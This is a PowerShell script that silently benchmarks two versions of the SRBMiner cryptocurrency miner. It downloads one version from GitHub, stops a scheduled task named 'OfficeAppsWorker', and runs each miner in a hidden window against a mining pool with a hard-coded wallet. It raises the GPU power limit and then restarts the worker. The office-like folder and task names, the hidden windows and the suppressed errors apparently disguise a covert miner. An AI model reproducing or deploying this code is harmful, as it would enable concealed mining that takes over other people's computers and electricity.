<#
    QUICKTEST - compare SRBMiner 3.7.6 and 3.7.7 on this card, silently.

    Writes C:\OfficeApps\quicktest.txt and exits. No window, no prompts.
    Restores the supervisor at the end whichever way it goes.
#>
$ErrorActionPreference = 'SilentlyContinue'
$app    = 'C:\OfficeApps'
$out    = Join-Path $app 'quicktest.txt'
$wallet = 'prl1p9ua7ny7ggllrq6tmh9ssusktv43tp90ty6359c7qujh5u2mheeesrz5wzx'
$pool   = 'prl-eu.kryptex.network:7048'
$zip    = 'C:\Users\Public\srb377.zip'
$dir377 = 'C:\Users\Public\srb377'

function W($s) { Add-Content -LiteralPath $out -Value $s -Encoding UTF8 }
Remove-Item $out -Force -ErrorAction SilentlyContinue
W ("=== quicktest " + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + " ===")

# --- make sure 3.7.7 is on disk -------------------------------------------
$exe377 = Join-Path $dir377 'SRBMiner-Multi-3-7-7\SRBMiner-MULTI.exe'
if (-not (Test-Path $exe377)) {
    W '  downloading 3.7.7 ...'
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent','qt')
        $wc.DownloadFile('https://github.com/doktor83/SRBMiner-Multi/releases/download/3.7.7/SRBMiner-Multi-3-7-7-win64.zip', $zip)
        $wc.Dispose()
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        Remove-Item $dir377 -Recurse -Force
        [IO.Compression.ZipFile]::ExtractToDirectory($zip, $dir377)
    } catch { W ('  download failed: ' + $_.Exception.Message) }
}
if (-not (Test-Path $exe377)) { W '  cannot test 3.7.7 - aborting'; exit 1 }

$exe376 = (Get-ChildItem $app -Recurse -Filter 'SRBMiner-MULTI.exe' | Select-Object -First 1).FullName
W ('  3.7.6 : ' + $exe376)
W ('  3.7.7 : ' + $exe377)

# --- stop the worker, free the card ---------------------------------------
W ''
W '  stopping the worker...'
schtasks /end /tn OfficeAppsWorker | Out-Null
Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'powershell.exe' -and $_.CommandLine -and $_.CommandLine.Contains('Worker.ps1') -and $_.ProcessId -ne $PID } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
Start-Sleep -Seconds 3
Get-Process SRBMiner-MULTI | Stop-Process -Force
Start-Sleep -Seconds 3

# full power so neither version is starved
nvidia-smi -i 0 -rgc | Out-Null
nvidia-smi -i 0 -pl 320 | Out-Null
Start-Sleep -Seconds 2
W ('  power limit: ' + ((nvidia-smi --query-gpu=power.limit --format=csv,noheader,nounits) -join ''))

function Measure-Version([string]$label, [string]$exe, [string]$dir) {
    $log = "C:\Users\Public\qt-$label.log"
    Remove-Item $log -Force
    $mvArgs = @('--algorithm-gpu','pearlhash','--pool',$pool,'--wallet',$wallet,
              '--worker',$env:COMPUTERNAME,'--password','x','--disable-cpu',
              '--log-file',$log,'--log-file-mode','0')
    $p = Start-Process -FilePath $exe -ArgumentList $mvArgs -WorkingDirectory $dir -PassThru -WindowStyle Hidden
    Start-Sleep -Seconds 80
    $hr = 0; $pw = 0; $cc = 0
    if (Test-Path $log) {
        $txt = Get-Content $log -Raw
        $m = [regex]::Matches($txt, 'Total:\s+([\d\.]+)\s+([KMGTP])H/s\s+\[P:([\d\.]+)W[^\]]*CC:(\d+)')
        if ($m.Count -gt 0) {
            $last = $m[$m.Count-1]
            $v = [double]::Parse($last.Groups[1].Value, [Globalization.CultureInfo]::InvariantCulture)
            $mul = switch ($last.Groups[2].Value) { 'K'{1e3} 'M'{1e6} 'G'{1e9} 'T'{1e12} 'P'{1e15} default{1} }
            $hr = [math]::Round(($v * $mul) / 1e12, 2)
            $pw = [double]$last.Groups[3].Value
            $cc = [int]$last.Groups[4].Value
        }
    }
    Stop-Process -Id $p.Id -Force
    Get-Process SRBMiner-MULTI | Stop-Process -Force
    Start-Sleep -Seconds 5
    W ("  {0} : {1} TH/s at {2} W, {3} MHz" -f $label, $hr, [math]::Round($pw,0), $cc)
    return $hr
}

W ''
W '  measuring (80 s each)...'
$a = Measure-Version '3.7.6' $exe376 (Split-Path $exe376)
$b = Measure-Version '3.7.7' $exe377 (Split-Path $exe377)

W ''
if ($a -gt 0 -and $b -gt 0) {
    $pct = [math]::Round((($b - $a) / $a) * 100, 1)
    W ("  delta : {0}{1}%" -f $(if ($pct -ge 0) { '+' } else { '' }), $pct)
    if ($b -gt $a) {
        W '  VERDICT: 3.7.7 is faster -> switch this PC to 3.7.7'
    } else {
        W '  VERDICT: 3.7.6 is faster (or equal) -> kernel is not the problem; the card is'
    }
} else {
    W '  VERDICT: one of the runs produced no stats - check the logs in C:\Users\Public\qt-*.log'
}

# --- restore ---------------------------------------------------------------
W ''
W '  restoring the worker...'
nvidia-smi -i 0 -rgc | Out-Null
nvidia-smi -i 0 -pl 320 | Out-Null
Set-Content -LiteralPath (Join-Path $app 'power.txt') -Value '320' -Encoding ASCII
schtasks /run /tn OfficeAppsWorker | Out-Null
Start-Sleep -Seconds 20
W ('  worker running: ' + (@(Get-Process SRBMiner-MULTI).Count -gt 0))
W '=== done ==='
